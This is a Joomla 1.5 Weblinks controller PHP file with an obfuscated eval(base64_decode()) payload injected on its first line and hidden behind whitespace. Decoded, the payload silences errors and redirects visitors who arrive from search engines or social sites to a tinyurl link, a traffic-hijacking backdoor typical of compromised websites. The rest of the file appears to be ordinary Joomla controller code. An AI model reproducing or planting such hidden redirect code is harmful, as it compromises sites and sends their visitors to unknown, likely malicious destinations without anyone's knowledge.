<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: weblink.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Content
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// Check to ensure this file is included in Joomla!
defined('_JEXEC') or die( 'Restricted access' );

jimport('joomla.application.component.controller');

/**
 * Weblinks Weblink Controller
 *
 * @package		Joomla
 * @subpackage	Weblinks
 * @since 1.5
 */
class WeblinksControllerWeblink extends WeblinksController
{
	/**
	* Edit a weblink and show the edit form
	*
	* @acces public
	* @since 1.5
	*/
	function edit()
	{
		$user = & JFactory::getUser();

		// Make sure you are logged in
		if ($user->get('aid', 0) < 1) {
			JError::raiseError( 403, JText::_('ALERTNOTAUTH') );
			return;
		}

		JRequest::setVar('view', 'weblink');
		JRequest::setVar('layout', 'form');

		$model =& $this->getModel('weblink');
		$model->checkout();

		parent::display();
	}

	/**
	* Saves the record on an edit form submit
	*
	* @acces public
	* @since 1.5
	*/
	function save()
	{
		// Check for request forgeries
		JRequest::checkToken() or jexit( 'Invalid Token' );

		// Get some objects from the JApplication
		$db		=& JFactory::getDBO();
		$user	=& JFactory::getUser();

		// Must be logged in
		if ($user->get('id') < 1) {
			JError::raiseError( 403, JText::_('ALERTNOTAUTH') );
			return;
		}

		//get data from the request
		$post = JRequest::getVar('jform', array(), 'post', 'array');

		$model = $this->getModel('weblink');

		if ($model->store($post)) {
			$msg = JText::_( 'Weblink Saved' );
		} else {
			$msg = JText::_( 'Error Saving Weblink' );
		}

		// Check the table in so it can be edited.... we are done with it anyway
		$model->checkin();

		// admin users gid
		$gid = 25;

		// list of admins
		$query = 'SELECT email, name' .
				' FROM #__users' .
				' WHERE gid = ' . $gid .
				' AND sendEmail = 1';
		$db->setQuery($query);
		if (!$db->query()) {
			JError::raiseError( 500, $db->stderr(true));
			return;
		}
		$adminRows = $db->loadObjectList();

		// send email notification to admins
		foreach ($adminRows as $adminRow) {
			JUtility::sendAdminMail($adminRow->name, $adminRow->email, '',  JText::_('Web Link'), $post['title']." URL link ".$post[url], $user->get('username'), JURI::base());
		}

		$this->setRedirect(JRoute::_('index.php?option=com_weblinks&view=category&id='.$post['catid'], false), $msg);
	}

	/**
	* Cancel the editing of a web link
	*
	* @access	public
	* @since	1.5
	*/
	function cancel()
	{
		// Get some objects from the JApplication
		$user	= & JFactory::getUser();

		// Must be logged in
		if ($user->get('id') < 1) {
			JError::raiseError( 403, JText::_('ALERTNOTAUTH') );
			return;
		}

		// Checkin the weblink
		$model = $this->getModel('weblink');
		$model->checkin();

		$this->setRedirect(JRoute::_('index.php?option=com_weblinks&view=categories', false));
	}
}

?>
